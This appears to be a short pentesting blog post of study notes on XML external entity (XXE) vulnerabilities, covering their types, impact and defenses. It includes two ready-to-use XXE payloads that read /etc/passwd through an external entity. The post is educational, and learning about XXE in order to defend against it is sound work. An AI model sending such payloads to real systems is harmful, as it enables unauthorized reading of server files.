---
layout: post
title: xml external entity (XXE) vulnerabilities
date: 2025-02-22
description: xml external entity (XXE) vulnerabilities
tags: theory web exploitation 
categories: pentesting
featured: false
toc:
  sidebar: left
---

app uses untrusted xml-documents - e.g. provided by the user
xml files are generated based on user input without input validation 

**2 Types:**
1.  in-band XXE: attacker receives immediate response to payload
2.  out-of-band XXE: no immediate respone, output has to be reflected to some file or server

# Examples
use xml file to read the contents of /etc/passwd
``` xml
<?xml version="1.0" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<entry id="1">
	<title>&xxe;</title>
	<content>Here is some content...</content>
</entry>
```
sometimes, the xml version has to be downgraded to a certain encoding:
``` xml
<?xml version="1.0" encoding="ISO-8859-1" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<entry id="1">
	<title>&xxe;</title>
	<content>Here is some content...</content>
</entry>
```
# Impact
- attackers can interact with backand or external systems
- readout of local files
- DoS attacks

# Defense
- use secure and updated xml-parser and SOAP framework
- deactivate parsing of DTDs (Document type definitions)
- validate data that is insertedinto an xml file
- validate xml file against xms 